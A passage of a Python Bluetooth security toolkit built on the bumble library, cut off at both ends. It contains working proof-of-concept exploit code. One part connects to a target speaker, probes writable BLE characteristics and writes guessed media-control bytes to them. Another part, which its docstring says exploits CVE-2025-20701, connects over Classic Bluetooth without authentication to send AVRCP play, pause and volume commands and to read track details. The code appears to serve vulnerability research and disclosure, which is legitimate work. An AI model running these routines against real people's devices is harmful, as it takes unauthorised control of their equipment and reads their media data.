        # ═══════════════════════════════════════════════════════════════════
        audio_chars = ["2b51", "2b7d", "2bc3", "2bba"]
        has_audio = any(cid in read_values_by_id for cid in audio_chars)

        if has_audio:
            print(
                f"\n  \033[1;35m┌─ AUDIO CAPABILITIES ──────────────────────────────────────┐\033[0m")

            # TMAP Role
            if "2b51" in read_values_by_id:
                print_field(
                    "TMAP Role", read_values_by_id["2b51"][1], indent=4)

            # Volume State
            if "2b7d" in read_values_by_id:
                print_field("Volume State",
                            read_values_by_id["2b7d"][1], indent=4)

            # Microphone Mute
            if "2bc3" in read_values_by_id:
                print_field("Microphone Mute",
                            read_values_by_id["2bc3"][1], indent=4)

            # Content Control ID
            if "2bba" in read_values_by_id:
                print_field("Content Control ID",
                            read_values_by_id["2bba"][1], indent=4)

        # ═══════════════════════════════════════════════════════════════════
        # ALL OTHER READABLE VALUES (grouped by service)
        # ═══════════════════════════════════════════════════════════════════
        # Collect values we haven't already displayed
        displayed_ids = {
            "2a00", "2a01", "2a24", "2a25", "2a26", "2a27", "2a28", "2a29",  # Device Info
            "2a19", "2a1a",  # Battery
            "2bb3", "2bb4", "2bb5", "2bb6", "2bb9", "2bbd", "2bbb", "2bc1", "2bc2",  # Telephony
            "2b93", "2b97", "2b98", "2b99", "2b9a", "2ba1", "2ba3",  # Media
            "2b51", "2b7d", "2bc3", "2bba",  # Audio
        }

        # Group remaining values by service
        from collections import defaultdict
        other_values = defaultdict(list)
        for char_name, short_id, service_name, formatted_value, raw_value in all_read_values:
            if short_id and short_id.lower() in displayed_ids:
                continue
            other_values[service_name].append((char_name, formatted_value))

        if other_values:
            print(
                f"\n  \033[1;35m┌─ ADDITIONAL CHARACTERISTICS ──────────────────────────────┐\033[0m")
            for service_name, values in other_values.items():
                print(f"    \033[1;32m{service_name}\033[0m")
                for char_name, formatted_value in values:
                    print_field(char_name, formatted_value, indent=6)

        # ═══════════════════════════════════════════════════════════════════
        # ENUMERATION STATISTICS
        # ═══════════════════════════════════════════════════════════════════
        print(
            f"\n  \033[1;35m┌─ ENUMERATION STATISTICS ──────────────────────────────────┐\033[0m")
        print_field("Total Services", len(services_found), indent=4)
        print_field("Characteristics Read", len(all_read_values), indent=4)
        print_field("Unknown Characteristics", len(
            unknown_characteristics) if unknown_characteristics else "0", indent=4)
        print_field("Connection Status",
                    "\033[1;32mConnected\033[0m", indent=4)

        print(f"\n\033[1;36m{'═' * term_width}\033[0m\n")

    except KeyboardInterrupt:
        print(f"\n  \033[1;33mCleaning up...\033[0m")
    except asyncio.CancelledError:
        print(f"\n  \033[1;33mOperation cancelled. Cleaning up...\033[0m")
    except Exception as e:
        logging.error("Enumeration failed: %s", e)
        import traceback
        traceback.print_exc()
    finally:
        # Restore original signal handler
        try:
            signal.signal(signal.SIGINT, original_handler)
        except Exception:
            pass
        # Clean up connections
        try:
            if connection:
                await connection.disconnect()
        except Exception:
            pass
        try:
            if t:
                await t.close()
        except Exception:
            pass


# =============================================================================
# BLE SPEAKER CONTROL PoC
# =============================================================================

# Common media control command patterns used by various vendors
MEDIA_CONTROL_PATTERNS = {
    "play": [
        bytes([0x01]),           # Simple play command
        bytes([0x00, 0x01]),     # Play with prefix
        bytes([0x41]),           # ASCII 'A' - some use this
        bytes([0xB0]),           # AVRCP-like play
        bytes([0x01, 0x00]),     # Little-endian play
        b"play",                 # ASCII command
        # Common Chinese module format
        bytes([0x7E, 0x04, 0x03, 0x00, 0x00, 0x00, 0xEF]),
    ],
    "pause": [
        bytes([0x02]),
        bytes([0x00, 0x02]),
        bytes([0xB1]),           # AVRCP-like pause
        bytes([0x02, 0x00]),
        b"pause",
        bytes([0x7E, 0x04, 0x03, 0x00, 0x01, 0x00, 0xEF]),
    ],
    "next": [
        bytes([0x03]),
        bytes([0x00, 0x03]),
        bytes([0xB3]),           # AVRCP-like next
        b"next",
        bytes([0x7E, 0x04, 0x01, 0x00, 0x00, 0x00, 0xEF]),
    ],
    "prev": [
        bytes([0x04]),
        bytes([0x00, 0x04]),
        bytes([0xB4]),           # AVRCP-like prev
        b"prev",
        bytes([0x7E, 0x04, 0x02, 0x00, 0x00, 0x00, 0xEF]),
    ],
    "vol-up": [
        bytes([0x05]),
        bytes([0x00, 0x05]),
        bytes([0x41]),           # Volume up
        b"vol+",
        bytes([0x7E, 0x04, 0x04, 0x00, 0x00, 0x00, 0xEF]),
    ],
    "vol-down": [
        bytes([0x06]),
        bytes([0x00, 0x06]),
        bytes([0x42]),           # Volume down
        b"vol-",
        bytes([0x7E, 0x04, 0x05, 0x00, 0x00, 0x00, 0xEF]),
    ],
    "mute": [
        bytes([0x07]),
        bytes([0x00, 0x07]),
        bytes([0x43]),           # Mute toggle
        b"mute",
    ],
}

# Known speaker/audio control service UUIDs
KNOWN_AUDIO_SERVICES = {
    "0000110b-0000-1000-8000-00805f9b34fb": "Audio Sink (A2DP)",
    "0000110a-0000-1000-8000-00805f9b34fb": "Audio Source",
    "0000110e-0000-1000-8000-00805f9b34fb": "AVRCP Target",
    "0000110c-0000-1000-8000-00805f9b34fb": "AVRCP Controller",
    "0000111e-0000-1000-8000-00805f9b34fb": "Handsfree",
    "00001108-0000-1000-8000-00805f9b34fb": "Headset",
    # Logitech-specific (from our scan)
    "000061fe-0000-1000-8000-00805f9b34fb": "Logitech Proprietary",
}


async def command_ble_speaker(args: argparse.Namespace):
    """Bluetooth speaker control PoC - probe and control audio devices via BLE.

    This command demonstrates that BLE-connected speakers often expose control
    characteristics without authentication, allowing unauthorized:
    - Media playback control (play, pause, skip)
    - Volume control
    - Device status reading

    This is a proof-of-concept for demonstrating BLE audio device security.
    """
    from bumble.device import Device, DeviceConfiguration, Peer
    from bumble.transport import open_transport_or_link
    from bumble.hci import Address

    controller = args.controller or "usb:0"
    target_address = args.target_address
    action = getattr(args, 'action', 'probe')
    char_uuid = getattr(args, 'char_uuid', None)
    write_data = getattr(args, 'write_data', None)
    timeout = getattr(args, 'timeout', 10.0)

    if not target_address:
        logging.error("Target address required. Use --target-address")
        return

    release_bluetooth_controller(controller)

    term_width = os.get_terminal_size().columns

    print(f"\n\033[1;36m{'═' * term_width}\033[0m")
    print(f"\033[1;36m  BLE SPEAKER CONTROL PoC\033[0m")
    print(f"\033[1;36m{'═' * term_width}\033[0m\n")
    print(f"  Target: {target_address}")
    print(f"  Action: {action}")
    if char_uuid:
        print(f"  Characteristic: {char_uuid}")
    print()

    t = None
    connection = None
    device = None

    try:
        t = await open_transport_or_link(controller)
        device_config = DeviceConfiguration()
        device_config.name = "RACE-Speaker-PoC"
        device_config.address = Address.generate_static_address()
        device = Device.from_config_with_hci(device_config, t.source, t.sink)
        await device.power_on()

        # Connect to device - auto-detect address type
        # Parse address - check for explicit type suffix
        addr_str = target_address.replace("/P", "").replace("/R", "")
        if "/P" in target_address:
            # Explicit public address
            address_types = [(Address.PUBLIC_DEVICE_ADDRESS, "public")]
        elif "/R" in target_address:
            # Explicit random address
            address_types = [(Address.RANDOM_DEVICE_ADDRESS, "random")]
        else:
            # Auto-detect: try public first (most common for commercial devices), then random
            address_types = [
                (Address.PUBLIC_DEVICE_ADDRESS, "public"),
                (Address.RANDOM_DEVICE_ADDRESS, "random")
            ]

        connection = None
        for addr_type, addr_type_name in address_types:
            address = Address(addr_str, addr_type)

            if len(address_types) > 1:
                print(f"  Trying {addr_type_name} address...")

            print(f"  Connecting to {addr_str} ({addr_type_name})...")

            try:
                connection = await asyncio.wait_for(
                    device.connect(address),
                    timeout=timeout
                )
                print(
                    f"  \033[1;32mConnected!\033[0m Handle: 0x{connection.handle:04X}\n")
                break  # Success!
            except asyncio.TimeoutError:
                print(
                    f"  \033[1;31mConnection timed out after {timeout}s\033[0m")
                if addr_type_name == address_types[-1][1]:
                    raise  # Last attempt, propagate error
                continue
            except Exception as e:
                print(f"  \033[1;31mConnection failed: {e}\033[0m")
                if addr_type_name == address_types[-1][1]:
                    raise  # Last attempt, propagate error
                continue

        if connection is None:
            print(
                f"  \033[1;31mFailed to connect with any address type\033[0m")
            print(f"\n  \033[1;33mPossible reasons:\033[0m")
            print(f"    • Device may have changed its MAC address (BLE privacy/RPA)")
            print(f"    • Device may be out of range or powered off")
            print(f"    • Device may be connected to another host")
            print(f"\n  \033[1;33mSuggestions:\033[0m")
            print(
                f"    • Run '\033[1;36mble-scan\033[0m' again to find the current address")
            print(f"    • Make sure the device is in pairing/discoverable mode")
            print(f"    • Try moving closer to the device")
            return

        # Discover services
        print(f"  Discovering GATT services...")
        peer = Peer(connection)
        await peer.discover_services()
        await peer.discover_characteristics()

        # Collect all characteristics
        all_chars = []
        writable_chars = []
        readable_chars = []

        for service in peer.services:
            service_uuid = str(service.uuid).lower()
            for char in service.characteristics:
                char_uuid_str = str(char.uuid).lower()
                props = []
                if char.properties & 0x02:
                    props.append("Read")
                    readable_chars.append((service_uuid, char))
                if char.properties & 0x04:
                    props.append("WriteNoResp")
                    writable_chars.append((service_uuid, char, "WriteNoResp"))
                if char.properties & 0x08:
                    props.append("Write")
                    writable_chars.append((service_uuid, char, "Write"))
                if char.properties & 0x10:
                    props.append("Notify")
                if char.properties & 0x20:
                    props.append("Indicate")

                all_chars.append({
                    "service": service_uuid,
                    "char": char,
                    "uuid": char_uuid_str,
                    "props": props
                })

        print(
            f"  Found {len(all_chars)} characteristics ({len(writable_chars)} writable, {len(readable_chars)} readable)\n")

        def print_header(title):
            print(f"\n\033[1;36m{'─' * term_width}\033[0m")
            print(f"\033[1;36m  {title}\033[0m")
            print(f"\033[1;36m{'─' * term_width}\033[0m")

        if action == "probe":
            # Probe mode - analyze the device for potential control characteristics
            print_header("SPEAKER CONTROL ANALYSIS")

            print(
                f"\n  \033[1;33m🔍 Writable Characteristics (potential controls):\033[0m\n")

            for svc_uuid, char, write_type in writable_chars:
                char_uuid_str = str(char.uuid).lower()

                # Try to identify purpose
                purpose = "Unknown"
                if "2a00" in char_uuid_str:
                    purpose = "Device Name (not a control)"
                elif any(x in char_uuid_str for x in ["ffd1", "ffd2", "ffe1", "ffe2"]):
                    purpose = "⚡ UART TX/RX - likely command channel!"
                elif "control" in char_uuid_str or "cmd" in char_uuid_str:
                    purpose = "⚡ Likely control characteristic!"

                print(f"    • {char_uuid_str}")
                print(f"      Service: {svc_uuid[:8]}...")
                print(f"      Write Type: {write_type}")
                print(f"      Purpose: {purpose}")
                print()

            print(f"  \033[1;33m📋 Suggested Commands:\033[0m\n")
            print(f"    Try reading all characteristics to understand the device:")
            print(
                f"    \033[0;36m  python race_toolkit.py -c {controller} --target-address {target_address} ble-speaker --action read-all\033[0m\n")
            print(f"    Try writing test patterns to find control characteristics:")
            print(
                f"    \033[0;36m  python race_toolkit.py -c {controller} --target-address {target_address} ble-speaker --action write-test\033[0m\n")
            print(f"    Try specific media control:")
            print(
                f"    \033[0;36m  python race_toolkit.py -c {controller} --target-address {target_address} ble-speaker --action play\033[0m\n")

        elif action == "read-all":
            # Read all readable characteristics
            print_header("READING ALL CHARACTERISTICS")

            for svc_uuid, char in readable_chars:
                char_uuid_str = str(char.uuid).lower()
                try:
                    value = await asyncio.wait_for(peer.read_value(char), timeout=5.0)

                    # Try to interpret the value
                    hex_val = value.hex() if value else "(empty)"
                    try:
                        ascii_val = value.decode(
                            'utf-8', errors='replace') if value else ""
                        ascii_val = ''.join(
                            c if c.isprintable() else '.' for c in ascii_val)
                    except Exception:
                        ascii_val = ""

                    print(f"\n  \033[1;32m✓\033[0m {char_uuid_str}")
                    print(f"    Hex: {hex_val}")
                    if ascii_val and len(ascii_val) > 0:
                        print(f"    ASCII: \"{ascii_val}\"")
                    if len(value) == 1:
                        print(f"    Int: {value[0]}")
                    elif len(value) == 2:
                        print(f"    Int16: {int.from_bytes(value, 'little')}")

                except asyncio.TimeoutError:
                    print(
                        f"\n  \033[0;33m⏱\033[0m {char_uuid_str} - Read timeout")
                except Exception as e:
                    print(f"\n  \033[0;31m✗\033[0m {char_uuid_str} - {e}")

        elif action == "write-test":
            # Probe writable characteristics with test patterns
            print_header("PROBING WRITABLE CHARACTERISTICS")
            print(
                f"\n  \033[0;33m⚠ This will write test data to the device!\033[0m\n")

            for svc_uuid, char, write_type in writable_chars:
                char_uuid_str = str(char.uuid).lower()

                # Skip standard characteristics
                if char_uuid_str.startswith("00002a") or "2a" in char_uuid_str[:10]:
                    continue

                print(f"\n  Testing: {char_uuid_str}")

                # First, try to read the characteristic to determine expected length
                expected_len = None
                current_value = None
                if char in [c for _, c in readable_chars]:
                    try:
                        current_value = await asyncio.wait_for(
                            peer.read_value(char), timeout=2.0)
                        expected_len = len(current_value)
                        print(
                            f"    Current value: {current_value.hex()} ({expected_len} bytes)")
                    except Exception:
                        pass

                # Build test patterns based on detected length
                test_patterns = []

                if expected_len == 1:
                    # Single byte controls
                    test_patterns = [
                        (bytes([0x00]), "Reset/Stop (0x00)"),
                        (bytes([0x01]), "Play/Start (0x01)"),
                        (bytes([0x02]), "Pause (0x02)"),
                        (bytes([0x03]), "Next (0x03)"),
                        (bytes([0x04]), "Prev (0x04)"),
                    ]
                    # Also try incrementing/decrementing current value
                    if current_value:
                        val = current_value[0]
                        if val > 0:
                            test_patterns.append(
                                (bytes([val - 1]), f"Decrement ({val-1})"))
                        if val < 255:
                            test_patterns.append(
                                (bytes([val + 1]), f"Increment ({val+1})"))

                elif expected_len == 2:
                    # 2-byte commands (common for media control)
                    test_patterns = [
                        (bytes([0x00, 0x00]), "Zero (0x0000)"),
                        (bytes([0x00, 0x01]), "Play (0x0001)"),
                        (bytes([0x00, 0x02]), "Pause (0x0002)"),
                        (bytes([0x01, 0x00]), "Play alt (0x0100)"),
                        (bytes([0x02, 0x00]), "Pause alt (0x0200)"),
                        (bytes([0xCD, 0x00]), "AVRCP Play (0xCD00)"),
                        (bytes([0xCE, 0x00]), "AVRCP Pause (0xCE00)"),
                    ]

                elif expected_len and expected_len > 2:
                    # Longer packets - try preserving structure, changing first/last bytes
                    if current_value:
                        # Try flipping first byte
                        modified = bytearray(current_value)
                        modified[0] = 0x01 if modified[0] == 0x00 else 0x00
                        test_patterns.append(
                            (bytes(modified), f"Toggle first byte"))

                        # Try flipping last byte
                        modified = bytearray(current_value)
                        modified[-1] = 0x01 if modified[-1] == 0x00 else 0x00
                        test_patterns.append(
                            (bytes(modified), f"Toggle last byte"))

                        # Try all zeros of same length
                        test_patterns.append(
                            (bytes(expected_len), f"All zeros ({expected_len}b)"))

                        # Try all ones of same length
                        test_patterns.append(
                            (bytes([0x01] * expected_len), f"All ones ({expected_len}b)"))
                else:
                    # Unknown length - try common sizes
                    test_patterns = [
                        (bytes([0x01]), "1-byte: Play (0x01)"),
                        (bytes([0x00, 0x01]), "2-byte: Play (0x0001)"),
                        (bytes([0x01, 0x00]), "2-byte: Play alt (0x0100)"),
                        (bytes([0x00, 0x00, 0x01]), "3-byte: Play (0x000001)"),
                        (bytes(20), "20-byte: Zeros"),
                    ]

                for pattern, desc in test_patterns:
                    try:
                        if write_type == "WriteNoResp":
                            await peer.write_value(char, pattern, with_response=False)
                        else:
                            await peer.write_value(char, pattern, with_response=True)
                        print(
                            f"    \033[1;32m✓\033[0m {desc} - Write succeeded!")
                        await asyncio.sleep(0.5)  # Give device time to react

                        # Try to read back the value to see if it changed
                        if char in [c for _, c in readable_chars]:
                            try:
                                new_value = await asyncio.wait_for(
                                    peer.read_value(char), timeout=1.0)
                                if new_value != current_value:
                                    print(
                                        f"        → Value changed to: {new_value.hex()}")
                            except Exception:
                                pass

                    except Exception as e:
                        err_str = str(e)
                        if "INVALID_ATTRIBUTE_LENGTH" in err_str:
                            print(
                                f"    \033[0;90m✗\033[0m {desc} - Wrong length")
                        elif "NOT_PERMITTED" in err_str or "WRITE_NOT_PERMITTED" in err_str:
                            print(
                                f"    \033[0;33m⚠\033[0m {desc} - Not permitted (needs auth?)")
                        else:
                            print(f"    \033[0;31m✗\033[0m {desc} - {e}")

        elif action in MEDIA_CONTROL_PATTERNS:
            # Try to send media control command
            print_header(f"SENDING {action.upper()} COMMAND")

            patterns = MEDIA_CONTROL_PATTERNS[action]

            if char_uuid:
                # User specified a characteristic
                target_chars = [(svc, c, wt) for svc, c, wt in writable_chars
                                if char_uuid.lower() in str(c.uuid).lower()]
                if not target_chars:
                    print(
                        f"\n  \033[0;31m✗ Characteristic {char_uuid} not found or not writable\033[0m")
                    return
            else:
                # Try all writable non-standard characteristics
                target_chars = [(svc, c, wt) for svc, c, wt in writable_chars
                                if not str(c.uuid).lower().startswith("00002a")]

            print(
                f"\n  Trying {len(patterns)} command patterns on {len(target_chars)} characteristic(s)...\n")

            success_count = 0
            for svc_uuid, char, write_type in target_chars:
                char_uuid_str = str(char.uuid).lower()
                print(f"  Characteristic: {char_uuid_str}")

                for pattern in patterns:
                    try:
                        if write_type == "WriteNoResp":
                            await peer.write_value(char, pattern, with_response=False)
                        else:
                            await peer.write_value(char, pattern, with_response=True)

                        print(
                            f"    \033[1;32m✓\033[0m Sent: {pattern.hex()} ({len(pattern)} bytes)")
                        success_count += 1
                        await asyncio.sleep(0.3)

                    except Exception as e:
                        error_str = str(e).lower()
                        if "not permitted" in error_str or "not allowed" in error_str:
                            print(
                                f"    \033[0;33m⚠\033[0m {pattern.hex()} - Not permitted (may need auth)")
                        else:
                            print(
                                f"    \033[0;31m✗\033[0m {pattern.hex()} - {e}")
                print()

            if success_count > 0:
                print(
                    f"\n  \033[1;32m✓ {success_count} write(s) succeeded!\033[0m")
                print(f"    Check if the speaker responded to any command.")
            else:
                print(
                    f"\n  \033[0;33m⚠ No writes succeeded. Device may require authentication.\033[0m")

        elif action in ["play", "pause", "next", "prev", "vol-up", "vol-down", "mute"]:
            # Handle as media control
            print_header(f"SENDING {action.upper()} COMMAND")
            patterns = MEDIA_CONTROL_PATTERNS.get(action, [])

            target_chars = [(svc, c, wt) for svc, c, wt in writable_chars
                            if not str(c.uuid).lower().startswith("00002a")]

            print(
                f"\n  Trying {len(patterns)} patterns on {len(target_chars)} writable characteristic(s)...\n")

            for svc_uuid, char, write_type in target_chars:
                char_uuid_str = str(char.uuid).lower()
                for pattern in patterns:
                    try:
                        await peer.write_value(char, pattern, with_response=(write_type == "Write"))
                        print(
                            f"  \033[1;32m✓\033[0m {char_uuid_str}: Sent {pattern.hex()}")
                        await asyncio.sleep(0.2)
                    except Exception:
                        pass  # Silently skip failures in this mode

        else:
            print(f"\n  Unknown action: {action}")

        print(f"\n\033[1;36m{'═' * term_width}\033[0m\n")

    except asyncio.TimeoutError:
        print(
            f"\n  \033[0;31m✗ Connection timed out after {timeout}s\033[0m\n")
    except Exception as e:
        logging.error("Speaker control failed: %s", e)
        import traceback
        traceback.print_exc()
    finally:
        try:
            if connection:
                await connection.disconnect()
            if t:
                await t.close()
        except Exception:
            pass


async def command_avrcp(args: argparse.Namespace):
    """AVRCP media control via Classic Bluetooth without authentication.

    This command connects to a Bluetooth audio device via Classic Bluetooth
    and uses AVRCP (Audio/Video Remote Control Profile) to control playback.

    This exploits CVE-2025-20701 - devices that allow BR/EDR connections
    without proper authentication, enabling unauthorized media control.
    """
    from bumble.device import Device, DeviceConfiguration
    from bumble.transport import open_transport_or_link
    from bumble.hci import Address
    from bumble.core import BT_BR_EDR_TRANSPORT
    from bumble import avrcp, avc

    controller = args.controller or "usb:0"
    target_address = args.target_address
    action = getattr(args, 'action', 'info')
    repeat_count = getattr(args, 'repeat', 1)
    hold_time = getattr(args, 'hold_time', 0.1)
    timeout = getattr(args, 'timeout', 10.0)

    if not target_address:
        logging.error("Target address required. Use --target-address")
        return

    release_bluetooth_controller(controller)

    term_width = min(os.get_terminal_size().columns, 100)

    # Map actions to AVRCP operation IDs
    AVRCP_OPERATIONS = {
        "play": avc.PassThroughFrame.OperationId.PLAY,
        "pause": avc.PassThroughFrame.OperationId.PAUSE,
        "stop": avc.PassThroughFrame.OperationId.STOP,
        "next": avc.PassThroughFrame.OperationId.FORWARD,
        "prev": avc.PassThroughFrame.OperationId.BACKWARD,
        "vol-up": avc.PassThroughFrame.OperationId.VOLUME_UP,
        "vol-down": avc.PassThroughFrame.OperationId.VOLUME_DOWN,
        "mute": avc.PassThroughFrame.OperationId.MUTE,
        "ff": avc.PassThroughFrame.OperationId.FAST_FORWARD,
        "rewind": avc.PassThroughFrame.OperationId.REWIND,
    }

    print(f"\n\033[1;36m{'═' * term_width}\033[0m")
    print(f"\033[1;36m  AVRCP MEDIA CONTROL - NO AUTHENTICATION\033[0m")
    print(f"\033[1;36m{'═' * term_width}\033[0m\n")
    print(f"  Target: {target_address}")
    print(f"  Action: {action}")
    print(f"  Auth: \033[1;31mDISABLED (CVE-2025-20701 exploit)\033[0m")
    if action != "info":
        print(f"  Repeat: {repeat_count}x")
        print(f"  Hold Time: {hold_time}s")
    print()

    # Use RFCOMMBumbleChecker for consistent connection approach
    checker = RFCOMMBumbleChecker(controller, target_address, False)
    await checker.setup()

    print(
        f"  \033[1;33mConnecting to {target_address} (NO AUTHENTICATION)...\033[0m")

    max_retries = 3
    retry_delay = 2.0
    connected = False

    for attempt in range(max_retries + 1):
        try:
            if checker.device is None:
                logging.error("Bluetooth device not initialized")
                return

            checker.connection = await asyncio.wait_for(
                checker.device.connect(
                    target_address, transport=BT_BR_EDR_TRANSPORT),
                timeout=timeout
            )
            connected = True
            print(f"  \033[1;32m✓ Connected WITHOUT authentication!\033[0m")
            print(f"    Handle: 0x{checker.connection.handle:04X}")
            break

        except asyncio.TimeoutError:
            print(
                f"\n  \033[1;31mConnection timed out after {timeout}s\033[0m")
            break

        except Exception as e:
            error_str = str(e).lower()

            if "page_timeout" in error_str:
                if attempt < max_retries:
                    print(
                        f"  \033[0;33m⚠ Device not responding (attempt {attempt+1}/{max_retries+1})\033[0m")
                    print(f"    Retrying in {retry_delay}s...")
                    await asyncio.sleep(retry_delay)
                    continue
                else:
                    print(
                        f"\n  \033[1;31m✗ Device not responding to Classic Bluetooth\033[0m")
                    print(f"\n  Possible causes:")
                    print(f"    • Device is connected to another phone/computer")
                    print(f"    • Device is in BLE-only mode")
                    print(f"    • Device is out of range or powered off")
                    print(f"\n  Try:")
                    print(f"    • Disconnect the device from your phone first")
                    print(f"    • Put device in pairing mode")
                    print(f"    • Move closer to the device")
                    await checker.close()
                    return

            elif "limited_resources" in error_str:
                print(f"  \033[0;33m⚠ Controller busy, resetting...\033[0m")
                await checker.close()
                release_bluetooth_controller(controller)
                await asyncio.sleep(2.0)
                checker = RFCOMMBumbleChecker(
                    controller, target_address, False)
                await checker.setup()
                continue

            else:
                print(f"\n  \033[1;31mConnection failed: {e}\033[0m")
                await checker.close()
                return

    if not connected:
        await checker.close()
        return

    connection = checker.connection
    avrcp_protocol = None

    try:
        # Connect AVRCP protocol directly - NO AUTHENTICATION
        print(f"\n  \033[1;33mConnecting AVRCP (no authentication)...\033[0m")

        # Create a minimal delegate
        class MinimalDelegate(avrcp.Delegate):
            def __init__(self):
                self.volume = 0x7F

            async def get_supported_player_application_setting_attributes(self):
                return []

            async def get_player_application_setting_attribute_text(self, attribute_ids):
                return []

            async def get_player_application_setting_values(self, attribute_ids):
                return []

            async def get_player_application_setting_value_text(self, attribute_id, value_ids):
                return []

            async def set_player_application_setting_values(self, settings):
                pass

            async def get_element_attributes(self, identifier, attribute_ids):
                return []

            async def inform_battery_status_of_ct(self, battery_status):
                return avrcp.StatusCode.SUCCESS

            async def set_absolute_volume(self, volume):
                self.volume = volume
                return volume

            async def get_now_playing_items(self, *args):
                return 0, []

        delegate = MinimalDelegate()

        # Try AVRCP connection with retries
        avrcp_retries = 3
        for avrcp_attempt in range(avrcp_retries):
            try:
                avrcp_protocol = avrcp.Protocol(delegate)
                await asyncio.wait_for(
                    avrcp_protocol.connect(connection),
                    timeout=10.0
                )
                print(
                    f"  \033[1;32m✓ AVRCP connected without authentication!\033[0m")
                break
            except asyncio.CancelledError:
                print(
                    f"\n  \033[0;33m⚠ AVRCP connection cancelled (attempt {avrcp_attempt + 1}/{avrcp_retries})\033[0m")
                if avrcp_attempt < avrcp_retries - 1:
                    print(f"    Connection may have dropped. Reconnecting...")
                    # Reconnect the underlying BR/EDR connection
                    try:
                        await checker.close()
                    except Exception:
                        pass
                    await asyncio.sleep(1.0)

                    # Re-setup checker
                    checker = RFCOMMBumbleChecker(
                        controller, target_address, False)
                    await checker.setup()

                    try:
                        checker.connection = await asyncio.wait_for(
                            checker.device.connect(
                                target_address, transport=BT_BR_EDR_TRANSPORT),
                            timeout=timeout
                        )
                        connection = checker.connection
                        print(f"    \033[1;32m✓ Reconnected!\033[0m")
                    except Exception as reconn_err:
                        print(
                            f"    \033[0;31m✗ Reconnection failed: {reconn_err}\033[0m")
                        continue
                else:
                    print(
                        f"\n  \033[1;31m✗ AVRCP connection failed after {avrcp_retries} attempts.\033[0m")
                    print(f"    The device may be rejecting the AVRCP connection.")
                    print(
                        f"    Try disconnecting the speaker from other devices first.")
                    return
            except Exception as e:
                error_str = str(e).lower()
                if "cancelled" in error_str:
                    print(
                        f"\n  \033[0;33m⚠ Connection lost during AVRCP setup (attempt {avrcp_attempt + 1}/{avrcp_retries})\033[0m")
                    if avrcp_attempt < avrcp_retries - 1:
                        await asyncio.sleep(1.0)
                        continue
                print(f"\n  \033[1;31m✗ AVRCP connection failed: {e}\033[0m")
                print(f"  Device may require authentication for AVRCP.")
                return

        if avrcp_protocol is None:
            print(
                f"\n  \033[1;31m✗ Failed to establish AVRCP connection.\033[0m")
            return

        await asyncio.sleep(0.3)

        if action == "info":
            print(f"\n\033[1;36m{'─' * term_width}\033[0m")
            print(f"\033[1;36m  DEVICE INFO (unauthenticated)\033[0m")
            print(f"\033[1;36m{'─' * term_width}\033[0m\n")

            # Get supported events
            try:
                print(f"  Querying capabilities...")
                events = await asyncio.wait_for(
                    avrcp_protocol.get_supported_events(),
                    timeout=5.0
                )
                print(f"  \033[1;32mSupported Events:\033[0m")
                for event in events:
                    print(f"    • {event.name}")
            except Exception as e:
                print(f"  \033[0;33m⚠ Could not get events: {e}\033[0m")

            # Get play status
            try:
                print(f"\n  Querying play status...")
                status = await asyncio.wait_for(
                    avrcp_protocol.get_play_status(),
                    timeout=5.0
                )
                print(f"  \033[1;32mPlay Status:\033[0m")
                print(
                    f"    • Status: {status.play_status.name if status.play_status else 'Unknown'}")
                if status.song_length and status.song_length != 0xFFFFFFFF:
                    mins, secs = divmod(status.song_length // 1000, 60)
                    print(f"    • Song Length: {mins}:{secs:02d}")
                if status.song_position and status.song_position != 0xFFFFFFFF:
                    mins, secs = divmod(status.song_position // 1000, 60)
                    print(f"    • Position: {mins}:{secs:02d}")
            except Exception as e:
                print(f"  \033[0;33m⚠ Could not get play status: {e}\033[0m")

            # Get track info
            try:
                print(f"\n  Querying track info...")
                attributes = await asyncio.wait_for(
                    avrcp_protocol.get_element_attributes(
                        0,
                        [avrcp.MediaAttributeId.TITLE, avrcp.MediaAttributeId.ARTIST_NAME,
                            avrcp.MediaAttributeId.ALBUM_NAME]
                    ),
                    timeout=5.0
                )
                if attributes:
                    print(f"  \033[1;32mTrack Info:\033[0m")
                    for attr in attributes:
                        print(
                            f"    • {attr.attribute_id.name}: {attr.attribute_value}")
            except Exception as e:
                print(f"  \033[0;33m⚠ Could not get track info: {e}\033[0m")

            print(
                f"\n  \033[1;32m✓ Successfully accessed device WITHOUT authentication!\033[0m")
            print(f"\n  Control commands:")
            print(f"    \033[0;36m... avrcp --action play\033[0m")
            print(f"    \033[0;36m... avrcp --action pause\033[0m")
            print(f"    \033[0;36m... avrcp --action next\033[0m")
            print(f"    \033[0;36m... avrcp --action vol-up --repeat 5\033[0m")

        else:
            # Send media control command
            operation = AVRCP_OPERATIONS.get(action)
            if not operation:
                print(f"\n  \033[0;31m✗ Unknown action: {action}\033[0m")
                return

            print(f"\n\033[1;36m{'─' * term_width}\033[0m")
            print(f"\033[1;36m  SENDING {action.upper()} (no auth)\033[0m")
            print(f"\033[1;36m{'─' * term_width}\033[0m\n")

            for i in range(repeat_count):
                if repeat_count > 1:
                    print(f"  [{i+1}/{repeat_count}] ", end="")
                else:
                    print(f"  ", end="")

                try:
                    print(f"Sending {action}... ", end="", flush=True)
                    await avrcp_protocol.send_key_event(operation, True)
                    await asyncio.sleep(hold_time)
                    await avrcp_protocol.send_key_event(operation, False)
                    print(f"\033[1;32m✓ Success!\033[0m")

                    if i < repeat_count - 1:
                        await asyncio.sleep(0.2)
                except Exception as e:
                    print(f"\033[0;31m✗ Failed: {e}\033[0m")

            print(
                f"\n  \033[1;32m✓ Command sent without authentication!\033[0m")

        print(f"\n\033[1;36m{'═' * term_width}\033[0m\n")

    except Exception as e:
        logging.error("AVRCP control failed: %s", e)
        import traceback
        traceback.print_exc()
    finally:
        await checker.close()


async def command_enumerate_classic(args: argparse.Namespace):
    """Enumerate Bluetooth Classic services without pairing (CVE-2025-20701 PoC).

    This command demonstrates the impact of CVE-2025-20701 by connecting to a
    device via Bluetooth Classic without authentication and enumerating all
    exposed services via SDP (Service Discovery Protocol).
    """
    from bumble.core import BT_BR_EDR_TRANSPORT

    # Select controller if not specified
    controller = select_bluetooth_controller(args.controller)
    if not controller:
        return

    # Release Bluetooth controller
    release_bluetooth_controller(controller)

    # If no target address, scan for Classic devices
    target_address = args.target_address
    if not target_address:
        devices = await scan_classic_devices(controller, timeout=10.0)
        target_address = select_classic_device(devices, None)
        if not target_address:
            return
        # Need to release again after scanning
        release_bluetooth_controller(controller)

    logging.info("=" * 60)
    logging.info("CVE-2025-20701: Missing BR/EDR Authentication - PoC")
    logging.info("=" * 60)
    logging.info("")
    logging.info(
        "This vulnerability allows connecting to Bluetooth Classic devices"
    )
    logging.info(
        "WITHOUT pairing. Normally, devices should require user confirmation"
    )
    logging.info(
